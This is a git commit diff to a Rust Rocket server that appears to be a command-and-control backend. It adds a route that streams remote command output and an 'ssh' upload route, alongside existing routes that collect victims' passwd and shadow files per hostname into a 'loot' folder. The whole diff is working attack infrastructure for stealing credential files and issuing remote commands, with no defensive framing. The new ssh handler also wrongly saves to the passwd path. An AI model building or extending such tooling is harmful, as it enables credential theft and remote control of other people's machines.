363a95d7febffe4f5e783627adb85c6ee5bb270a
Mark Wilkinson <mht197@protonmail.com>
2021-10-30 06:12:07 +0000

    Its jank but it kind of works, commands and file upload

--- src/main.rs
+++ src/main.rs
@@ -1,6 +1,7 @@
 #[macro_use]
 extern crate rocket;
 
+use rocket::tokio;
 use rocket::{data::ToByteUnit, Data};
 use std::{io, fs, fs::File};
 
@@ -8,14 +9,30 @@ use std::{io, fs, fs::File};
 fn index() -> &'static str {
     "Web interface in development, not yet implemented, please use the command line client"
 }
+#[post("/command", format = "plain", data = "<data>")]
+async fn command_post(data: Data<'_>) -> std::io::Result<()> {
+    data.open(512.megabytes())
+        .stream_to(tokio::io::stdout())
+        .await?;
 
+    Ok(())
+}
 #[get("/command")]
 fn command() -> String {
     let mut command = String::new();
     io::stdin().read_line(&mut command).expect("error: unable to read user input");
     format!("{}", command)
 }
-
+#[post("/post/<hostname>/ssh", format = "plain", data = "<data>")]
+async fn ssh(data: Data<'_>, hostname: String) -> std::io::Result<()> {
+    let file_location = format!("loot/{}/passwd", hostname);
+    let dir = format!("loot/{}", hostname);
+    fs::create_dir_all(&dir).ok();
+    println!("The dir created is {}.", &dir);
+    let mut _file = File::create(&file_location)?;
+    let _stream = data.open(1.megabytes()).into_file(file_location).await?;
+    Ok(())
+}
 #[post("/post/<hostname>/passwd", format = "plain", data = "<data>")]
 async fn passwd(data: Data<'_>, hostname: String) -> std::io::Result<()> {
     //create directory and declare location for the passwd file
@@ -48,6 +65,6 @@ async fn shadow(data: Data<'_>, hostname: String) -> std::io::Result<()> {
 fn rocket() -> _ {
     fs::create_dir_all("loot").ok();
 
-    rocket::build().mount("/", routes![index, passwd, shadow, command])
+    rocket::build().mount("/", routes![index, passwd, shadow, command, ssh, command_post])
 }
 //
